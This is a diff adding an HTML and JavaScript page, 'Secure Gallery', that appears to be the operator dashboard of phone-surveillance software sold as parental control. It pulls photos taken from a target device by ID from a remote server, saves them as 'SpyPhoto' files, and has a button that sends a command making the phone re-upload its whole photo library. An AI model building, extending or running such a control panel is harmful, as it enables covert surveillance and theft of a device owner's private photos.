@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Smart Gallery</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* --- PREMIUM DARK THEME --- */
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --primary: #38bdf8;
+            --primary-dark: #0284c7;
+            --danger: #ef4444;
+            --danger-dark: #b91c1c;
+            --warning: #f59e0b; /* Yellow for Sort */
+            --text-main: #f1f5f9;
+            --text-muted: #94a3b8;
+        }
+
+        body { 
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            margin: 0; padding: 20px;
+            overflow-x: hidden;
+        }
+
+        h2 { 
+            color: var(--primary); 
+            text-transform: uppercase; 
+            letter-spacing: 3px; 
+            margin-bottom: 5px; 
+            font-size: 2rem;
+            text-shadow: 0 0 15px rgba(56, 189, 248, 0.3);
+        }
+
+        p#status { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 30px; }
+
+        /* --- CONTROL BAR --- */
+        .controls { 
+            display: flex; 
+            justify-content: center; 
+            flex-wrap: wrap; 
+            gap: 15px; 
+            margin-bottom: 30px; 
+            background: rgba(30, 41, 59, 0.5);
+            padding: 15px;
+            border-radius: 50px;
+            max-width: 800px; /* Thoda chouda kiya button ke liye */
+            margin-left: auto; 
+            margin-right: auto;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        /* Buttons Styling */
+        .btn {
+            padding: 12px 25px; 
+            border: none; border-radius: 30px; 
+            font-weight: 600; cursor: pointer; 
+            font-size: 0.95rem;
+            display: inline-flex; align-items: center; gap: 8px;
+            text-decoration: none; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        /* Blue Button */
+        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: white; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(14, 165, 233, 0.4); }
+
+        /* Gray Button */
+        .btn-secondary { background: #334155; color: #cbd5e1; }
+        .btn-secondary:hover { background: #475569; color: white; transform: translateY(-2px); }
+
+        /* Red Button */
+        .btn-danger { background: linear-gradient(135deg, var(--danger), var(--danger-dark)); color: white; }
+        .btn-danger:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4); }
+
+        /* 🔥 NEW: Yellow Sort Button */
+        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
+        .btn-warning:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4); }
+
+        /* --- GALLERY GRID --- */
+        .gallery-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            max-width: 1200px;
+            margin: auto;
+            padding-bottom: 40px;
+        }
+        
+        .gallery-item {
+            position: relative;
+            overflow: hidden;
+            border-radius: 15px;
+            border: 2px solid #1e293b;
+            aspect-ratio: 1 / 1;
+            cursor: pointer;
+            transition: 0.3s;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .gallery-img {
+            width: 100%; height: 100%; object-fit: cover;
+            transition: transform 0.4s ease;
+        }
+
+        .gallery-item:hover { border-color: var(--primary); box-shadow: 0 8px 25px rgba(56, 189, 248, 0.2); }
+        .gallery-item:hover .gallery-img { transform: scale(1.1); }
+
+        /* Load More Section */
+        #loadMoreContainer { margin: 40px 0; display: none; }
+
+        /* --- MODAL (Lightbox) --- */
+        .modal { 
+            display: none; position: fixed; z-index: 1000; 
+            left: 0; top: 0; width: 100%; height: 100%; 
+            background-color: rgba(0,0,0,0.95); backdrop-filter: blur(8px); 
+        }
+        .modal-content { 
+            margin: auto; display: block; 
+            max-width: 90%; max-height: 80vh; 
+            margin-top: 5vh; 
+            border-radius: 8px; 
+            box-shadow: 0 0 30px rgba(56, 189, 248, 0.3); 
+            animation: zoomIn 0.3s ease;
+        }
+        
+        @keyframes zoomIn { from {transform: scale(0.9); opacity: 0} to {transform: scale(1); opacity: 1} }
+
+        .modal-actions { margin-top: 20px; display: flex; justify-content: center; gap: 20px; }
+
+        .close { 
+            position: absolute; top: 20px; right: 40px; 
+            color: #fff; font-size: 45px; cursor: pointer; transition: 0.2s; 
+        }
+        .close:hover { color: var(--primary); transform: rotate(90deg); }
+
+    </style>
+</head>
+<body>
+
+    <h2><i class="fas fa-images"></i> Secure Gallery</h2>
+    <p id="status">Waiting for connection...</p>
+
+    <div class="controls">
+        <a href="index.html" class="btn btn-secondary">
+            <i class="fas fa-home"></i> Home
+        </a>
+
+        <button class="btn btn-primary" onclick="location.reload()">
+            <i class="fas fa-sync-alt"></i> Refresh
+        </button>
+
+        <button id="sortBtn" class="btn btn-warning" onclick="toggleSort()">
+            <i class="fas fa-sort-amount-down"></i> Sort: Newest
+        </button>
+
+        <button class="btn btn-danger" onclick="resetGalleryHistory()">
+            <i class="fas fa-trash-restore"></i> Reset History
+        </button>
+    </div>
+    
+    <div class="gallery-container" id="gallery"></div>
+
+    <div id="loadMoreContainer">
+        <button class="btn btn-secondary" onclick="loadGallery(true)">
+            <i class="fas fa-arrow-circle-down"></i> Load More Photos
+        </button>
+    </div>
+
+    <div id="myModal" class="modal">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <img class="modal-content" id="img01">
+        
+        <div class="modal-actions">
+            <a id="downloadLink" href="#" target="_blank" class="btn btn-primary">
+                <i class="fas fa-download"></i> Download HD
+            </a>
+            <button class="btn btn-danger" onclick="closeModal()">
+                <i class="fas fa-times"></i> Close
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = "https://parents-control-website.onrender.com"; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+        let nextCursor = null; 
+        
+        // 🔥 DATA HOLDER FOR SORTING
+        let allPhotos = [];         // Saari photos yahan store hongi
+        let isNewestFirst = true;   // Default sort order
+
+        if (!deviceId) {
+            document.getElementById('status').innerHTML = "<span style='color:var(--danger)'>❌ Error: Device ID Missing</span>";
+        } else {
+            loadGallery(false); 
+        }
+
+        // --- 1. LOAD GALLERY FUNCTION ---
+        function loadGallery(isLoadMore) {
+            const status = document.getElementById('status');
+            const loadMoreContainer = document.getElementById('loadMoreContainer');
+            
+            if (!isLoadMore) {
+                status.innerText = "⏳ Connecting to Secure Cloud...";
+                allPhotos = []; // Reset list agar fresh load hai
+                document.getElementById('gallery').innerHTML = ""; 
+            } else {
+                status.innerText = "⏳ Loading more memories...";
+            }
+
+            let apiUrl = `${BASE_URL}/api/gallery-list/${deviceId}`;
+            if (isLoadMore && nextCursor) {
+                apiUrl += `?next_cursor=${nextCursor}`;
+            }
+
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.photos && data.photos.length > 0) {
+                        status.innerHTML = `<span style='color:#4ade80'>✅ Gallery Updated (${allPhotos.length + data.photos.length} items)</span>`;
+                        
+                        // Array mein naya data add karo
+                        data.photos.forEach(photo => allPhotos.push(photo));
+
+                        // HTML Render karo
+                        renderGallery();
+
+                        nextCursor = data.next_cursor;
+                        loadMoreContainer.style.display = nextCursor ? "block" : "none";
+
+                    } else {
+                        if(!isLoadMore) status.innerText = "📂 No Photos Found. Try clicking 'Reset History' then 'Get Gallery'.";
+                        loadMoreContainer.style.display = "none";
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    status.innerText = "❌ Connection Failed. Server might be sleeping.";
+                });
+        }
+
+        // --- 🔥 2. RENDER GALLERY & SORTING LOGIC ---
+        function renderGallery() {
+            const galleryDiv = document.getElementById('gallery');
+            galleryDiv.innerHTML = ""; // Pehle clear karo
+
+            // Copy banake sort karo taki original data kharab na ho
+            let displayList = [...allPhotos];
+
+            // Agar user ne Oldest First manga hai to ulta kar do
+            if (!isNewestFirst) {
+                displayList.reverse();
+            }
+
+            // Loop chala ke HTML banao
+            displayList.forEach(imgUrl => {
+                let itemDiv = document.createElement('div');
+                itemDiv.className = 'gallery-item';
+                
+                let img = document.createElement('img');
+                img.src = imgUrl; 
+                img.className = "gallery-img";
+                img.loading = "lazy"; 
+                
+                itemDiv.onclick = function() { openModal(imgUrl); };
+                itemDiv.appendChild(img);
+                galleryDiv.appendChild(itemDiv);
+            });
+        }
+
+        function toggleSort() {
+            isNewestFirst = !isNewestFirst; // Switch True/False
+            const btn = document.getElementById('sortBtn');
+
+            if (isNewestFirst) {
+                btn.innerHTML = `<i class="fas fa-sort-amount-down"></i> Sort: Newest`;
+            } else {
+                btn.innerHTML = `<i class="fas fa-sort-amount-up"></i> Sort: Oldest`;
+            }
+
+            renderGallery(); // Wapas draw karo bina server call kiye
+        }
+
+        // --- 3. RESET HISTORY LOGIC ---
+        function resetGalleryHistory() {
+            if (!deviceId) return alert("Device ID not found!");
+
+            if (!confirm("⚠️ WARNING: Isse phone ki 'Already Uploaded' history delete ho jayegi.\n\nIska matlab agli baar phone SAARI photos dobara upload karega.\n\nKya aap sure hain?")) {
+                return;
+            }
+
+            const btn = document.querySelector('.btn-danger');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Sending Command...`;
+            btn.disabled = true;
+
+            fetch(`${BASE_URL}/api/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    deviceId: deviceId, 
+                    command: 'reset_gallery' 
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert("✅ Command Sent! \n\nAb phone gallery history clear kar dega. \nThodi der baad 'Get Gallery' command bhejein.");
+            })
+            .catch(err => {
+                alert("❌ Command Failed. Check Server Logs.");
+            })
+            .finally(() => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            });
+        }
+
+        // --- 4. MODAL FUNCTIONS ---
+        function openModal(src) {
+            const modal = document.getElementById('myModal');
+            const modalImg = document.getElementById('img01');
+            const dlBtn = document.getElementById('downloadLink');
+
+            modal.style.display = "block";
+            modalImg.src = src;
+            dlBtn.href = src;
+            dlBtn.download = "SpyPhoto_" + Math.floor(Math.random() * 10000) + ".jpg"; 
+        }
+
+        function closeModal() {
+            document.getElementById('myModal').style.display = "none";
+        }
+        
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('myModal')) {
+                closeModal();
+            }
+        }
+    </script>
+
+</body>
+</html>
